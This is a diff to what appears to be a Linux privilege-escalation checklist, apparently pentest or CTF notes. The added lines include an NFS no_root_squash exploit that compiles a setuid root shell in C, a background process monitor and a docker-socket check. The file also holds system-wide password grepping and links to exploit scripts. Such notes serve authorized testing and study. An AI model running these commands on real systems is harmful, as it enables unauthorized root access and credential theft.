@@ -43,12 +43,17 @@ functions:
         - [ ] cat /etc/crontab
         - [ ] systemctl list-timers --all
         - [ ] grep "CRON" /var/log/cron.log
-        - [ ] process monitoring (below script)
+        - [ ] Is CRON running but you can't tell what??  process monitoring (below script)
+              nohup bash ./procmon.sh > procs.txt &
+              cat procs.txt
           https://github.com/unkn0wnsyst3m/scripts/blob/master/procmon.sh
 
-        File Systems
-        - [ ] cat /etc/exports
-        - [ ] showmount -e <targetip>  #mount -o rw,vers=2 <targetip>:<mountable-folder> <localmount>
+        File Systems #NoRootSquash
+        - [ ] cat /etc/exports | grep no_root_squash
+              showmount -e <targetip>  #mount -o rw,vers=2 <targetip>:<mountable-folder> <localmount>
+              echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > shell.c
+              gcc shell.c -o shell
+              chmod +s+x shell
 
         Password Hunting:
         - [ ] grep --color=auto -rnw '/' -ie "PASSWORD=" 2>/dev/null
@@ -102,6 +107,9 @@ functions:
           https://github.com/unkn0wnsyst3m/scripts/blob/master/nginx-CVE-2016-1247.sh
         - [ ] ps aux | grep mysqld  # running as root?
           https://mfnttps.github.io/mfnttps/mysql-code_exec/
+        - [ ] cat /etc/exports | grep no_root_squash  #see above
+        - [ ] groups | grep docker && ls -al /var/run/docker.sock
+          https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket
 
     - description: LinPeas
       code: |
